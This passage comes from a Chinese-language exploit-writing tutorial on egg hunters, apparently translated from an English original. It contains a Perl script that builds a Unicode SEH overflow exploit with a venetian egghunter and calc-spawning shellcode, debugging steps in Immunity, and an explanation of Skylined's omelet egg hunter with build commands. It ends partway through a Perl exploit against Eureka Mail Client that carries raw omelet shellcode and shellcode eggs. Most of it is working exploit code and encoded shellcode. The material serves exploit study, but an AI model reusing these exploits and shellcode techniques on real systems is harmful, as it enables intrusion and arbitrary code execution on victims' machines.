$align=$align."\x58"; #pop eax
$align=$align."\x6d"; #align/nop
#now increase the address in eax so it would point to our buffer
$align = $align."\x05\x10\x11"; #add eax,11001300
$align=$align."\x6d"; #align/nop
$align=$align."\x2d\x02\x11"; #sub eax,11000200
$align=$align."\x6d"; #align/nop
#eax now points at egghunter
#jump to eax now
my $jump = "\x50"; #push eax
$jump=$jump."\x6d"; #nop/align
$jump=$jump."\xc3"; #ret
#fill the space between here and eax
my $padding="A" x 73;
#this is what will be put at eax :
my $egghunter ="PPYAIAIAIAIAQATAXAZAPA3QADAZA".
"BARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA".
"58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABAB".
"AB30APB944JB36CQ7ZKPKPORPR2JM2PXXMNNOLKUQJRT".
"ZOVXKPNPM0RT4KKJ6ORUZJFO2U9WKOZGA";
# - ok so far the exploit looks the same as the one used in tutorial 7
# except for the fact that the shellcode is the unicode version of
# an egghunter looking for the "0t0t" egg marker
# the egghunter was converted to unicode using eax as basereg
#
# Between the egghunter and the shellcode that it should look for
# I'll write some garbage (a couple of X's in this case)
# So we'll pretend the real shellcode is somewhere out there
my $garbage = "X" x 50;
# real shellcode (venetian, uses EAX as basereg)
# will spawn calc.exe
my $shellcode="PPYAIAIAIAIAQATAXAZAPA3QADAZA".
"BARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAX".
"A58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABAB".
"ABAB30APB944JBKLK8OTKPKPM0DKOUOLTKSLM5SHKQJ".
"O4K0OLXTKQOMPKQZKOYTKP44KM1ZNNQY0V96L3TWPT4".
"KW7QHJLMKQWRZKL4OKQDNDKTBUIUTK1OO4KQJK1VTKL".
"LPK4K1OMLM1ZK4KMLTKKQJKSY1LMTKTGSNQWPRDTKOP".
"NPU5902XLLTKOPLLDK2PMLFMTKQXM8JKM94K3P6PM0K".
"PKP4KQXOLQONQL6QPPV59KH53GP3K0PQXJPDJM4QO2H".
"68KN4JLN0WKOK7QSC1RLQSKPA";
# between the egg marker and shellcode, we need to align
# so eax points at the beginning of the real shellcode
my $align2 = "\x6d\x57\x6d\x58\x6d"; #nop, push edi, nop, pop eax, nop
$align2 = $align2."\xb9\x1b\xaa"; #mov ecx, 0xaa001b00
$align2 = $align2."\xe8\x6d"; #add al,ch + nop (increase eax with 1b)
$align2 = $align2."\x50\x6d\xc3"; #push eax, nop, ret
#eax now points at the real shellcode
#fill up rest of space & trigger access violation
my $filler = ("\xcc" x (15990-length($shellcode)));
#payload
my $payload = $junk.$nseh.$seh.$align.$jump.$padding.$egghunter;
$payload=$payload.$garbage."0t0t".$align2.$shellcode.$filler;
open(myfile,">$sploitfile");
print myfile $payload;
print "Wrote " . length(($payload)." bytes to $sploitfile\n";
close(myfile);
噢，成功了！
NOTE:如果需要减少一点攻击代码的尺寸，你可以通过直接使用EDI寄存器的值，而不是使用push + edi指令来
给调整代码减少几个字节（这需要使用EDI做基础寄存器来生成venetian shellcode）。你可以在上一
个调整寄存器的代码后用几个简单的指令来把使EDI寄存器指向正确的地址。
下面是另一个unicode版本的寻蛋代码的例子：
http://www.pornosecurity.org/blog/exploiting-bittorrent
下面是对应的演示demo的下载地址
http://www.pornosecurity.org/bittorrent/bittorrent.html
使用 Immunity 调试这类 Exploit 的的技巧。
这时一个利于SHE的exploit.所以当程序crash时，找到SHE链并在链上设置断点。使用(SHIFT + F9)跳过异常，
然后断点将被触发。（在我的机器上，SHE链位于地址0x0012f2ac）.
单步执行(F7)直到解码代码开始解码寻蛋代码、并把解码后的指令压进栈中为止。
在我的机器上，解码代码把原始的寻蛋代码（即解码后的解码代码）写入到地址0x0012F460处。
按下Ctrl+F12，程序将断在0x0012F460.这是原始的寻蛋代码已经重新被组成并准备好开始在内存中寻找标记。
在地址0x0012F47B（见上图），我们会看到蛋找到后要执行的代码。在地址0x0012F47B处放置断点，并再次按
下CTRL+F12。当程序再次停下来时，就表明蛋找到了。单步执行（F7）直到jmp edi指令被执行。该指令执行后，
程序将停在标记后面的一个字节上准备继续运行。
这里就是我们放置第二次对齐代码的地方。这段代码将把shellcode(解码器桩)的地址保存到EAX中，并执行PUSH
EAX + ret指令。
摊煎饼式的寻蛋代码（Omelet egg hunter）
啥,打碎的鸡蛋？你在说什么啊？
有时候我们找不到一大块内存放shellcode，但是我们可以控制多块小内存空间的内容。这时候我们就可以用到
一种摊煎饼式的寻蛋技术。
这种技术需要把shellcode拆分成小块，然后把这个些小块单独的写到内存中，然后气度寻蛋算法来找到所有的
蛋并合并它们，然后开始摊煎饼。噢，错了，我的意思是开始执行合并后的代码。
摊煎饼式的寻蛋算法的中信思想和普通的寻蛋算法一样，除了两处主要的不同：
 Shellcode被拆分成小块（可以理解为有多个蛋）。
 Shellcode执行前需要进行合并（而普通的算法则是找到后直接执行）。
除此之外，摊煎饼式寻蛋代码（90个字节）会显著的比普通寻蛋代码（大约30到60个字节）更大。
一篇 Berend-Jan Wever 写的关于这个技术的文档（你可以在这个地方下载到对应的 Google 项目文件）中
这样写到：
类似于寻蛋 shellcode，不过需要在用户空间寻找多个小代码片段并把她们合并成一个大块的 shellcode 并执行
它。这在你不能把一大块代码注入到目标进程中，但能注入多块小代码并执行其中的一块时非常有用。
那么该怎么做呢？
首先需要把原始的shellcode拆分成多个小块。每一个小块需要一个包含下列信息的头部：
 小代码块的长度
 小代码块的索引值
 用于检测小代码快的3字节标记
摊煎饼式的寻蛋代码同样也需要直到每个小代码块的大小、小代码快的数目、是被小代码快的3字节标记。
寻蛋代码执行时，搜索整个内存，寻找所有的小代码块，并在栈上重新生成原始的shellcode。当代码合并好以
后就跳转到shellcode开始执行代码。Skylined写的摊煎饼的寻蛋代码还注入了一个自定义的SHE handle来处理读内
存时发生的Access violations.
幸运的是，Skylined写了一组脚本来自动化的完成拆分代码和生成寻但代码。你可以从这里下载这些代码。Zip
包中包括寻蛋代码的Nasm文件和拆分shellcode的python脚本）。如果需要你可以到这里下载nasm程序。
我把代码解压到C:\omelet代码。Nasm安装在“c:\program files\nasm”目录。
把nasm文件编译成二进制的命令如下：
C:\omelet>"c:\program files\nasm\nasm.exe" -f bin -o w32_omelet.bin w32_SEH_omelet.asm
-w+error
（这个脚本只需运行一次，一旦你有了这个文件，你就可以重复使用）.
如何实现一个摊煎饼式的寻蛋算法？
1. 首先创建一个保存有你想运行的shellcode代码的文件（这里文件名用shellcode.bin）。
（你可以使用下面的脚本来生成shellcode.bin文件。你可以用自己的shellcode来替换脚本中的shellcode, 脚本
中是一个启动计算器程序的shellcode）。
my $scfile="shellcode.bin";
my $shellcode="\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49" .
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a" .
"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47" .
"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c" .
"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a" .
"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50" .
"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43" .
"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a" .
"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c" .
"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44" .
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c" .
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47" .
"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50" .
"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44" .
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43" .
"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42" .
"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b" .
"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45" .
"\x31\x42\x4c\x42\x43\x45\x50\x41\x41";
open(FILE,">$scfile");
print FILE $shellcode;
close(FILE);
print "Wrote ".length($shellcode)." bytes to file ".$scfile."\n";
运行这个脚本后，文件保存着二进制的shellcode.
2. 把shellcode拆分成小块。
假定我们有一些130字节内存块的使用权。那么我们需要把303个字节的代码切成3个小块（考虑到会有一些
额外的信息，最终可能是3或4个小块）。最大的块占用127个字节.同时我们也需要一个标记，占用6字节。这里
我们使用0xBADA55.
下面是生成结果shellcode的脚本：
C:\omelet>w32_SEH_omelet.py
Syntax:
w32_SEH_omelet.py "omelet bin file" "shellcode bin file" "output txt file"
[egg size] [marker bytes]
Where:
omelet bin file = The omelet shellcode stage binary code followed by three
bytes of the offsets of the "marker bytes", "max index"
and "egg size" variables in the code.
shellcode bin file = The shellcode binary code you want to have stored in
the eggs and reconstructed by the omelet shellcode stage
code.
output txt file = The file you want the omelet egg-hunt code and the eggs
to be written to (in text format).
egg size = The size of each egg (legal values: 6-127, default: 127)
marker bytes = The value you want to use as a marker to distinguish the
eggs from other data in user-land address space (legal
values: 0-0xFFFFFF, default value: 0x280876)
具体到我们的例子，命令行如下：
C:\omelet>w32_SEH_omelet.py w32_omelet.bin shellcode.bin calceggs.txt 127 0xBADA55
打开新建的calceggs.txt文件，可以看到包含以下内容：
 摊煎饼式的寻蛋代码（用来寻找小块的代码）
 分成小块的需要放在内存某个地方的代码
看上图可以发现，那些小块的代码有2部分组成：
 前5个字节包含了大小(0x7A=122)、索引号(0xFF-0xFE-0xFD)、和标记（0x55,0xDA,0xBA=>0xBADA55）信息。122+5
字节的头部=127字节。
 接下来的字节就是从原始的shellcode中截取出来的。
在最后一个块中，多余的空间用0x40填充。
3. 构建exploit
让我们使用 Eureka Mail Client exploit 来测试下这个概念。我们在各个小块代码中增加一些随机字符来模
拟代码被随机的放在内存的不同位置。
use Socket;
#fill out the local IP or hostname
#which is used by Eureka EMail as POP3 server
#note : must be exact match !
my $localserver = "192.168.0.193";
#calculate offset to EIP
my $junk = "A" x (723 - length($localserver));
my $ret=pack('V',0x7E47BCAF); #jmp esp from user32.dll
my $padding = "\x90" x 1000;
my $omelet_code = "\x31\xFF\xEB\x23\x51\x64\x89\x20\xFC\xB0\x7A\xF2".
"\xAE\x50\x89\xFE\xAD\x35\xFF\x55\xDA\xBA\x83\xF8\x03\x77\x0C\x59".
"\xF7\xE9\x64\x03\x42\x08\x97\xF3\xA4\x89\xF7\x31\xC0\x64\x8B\x08".
"\x89\xCC\x59\x81\xF9\xFF\xFF\xFF\xFF\x75\xF5\x5A\xE8\xC7\xFF\xFF".
"\xFF\x61\x8D\x66\x18\x58\x66\x0D\xFF\x0F\x40\x78\x06\x97\xE9\xD8".
"\xFF\xFF\xFF\x31\xC0\x64\xFF\x50\x08";
my $egg1 = "\x7A\xFF\x55\xDA\xBA\x89\xE2\xDA\xC1\xD9\x72\xF4\x58\x50".
"\x59\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5A\x56\x54\x58\x33".
"\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42".
"\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58".
"\x50\x38\x41\x43\x4A\x4A\x49\x4B\x4C\x4A\x48\x50\x44\x43\x30\x43\x30".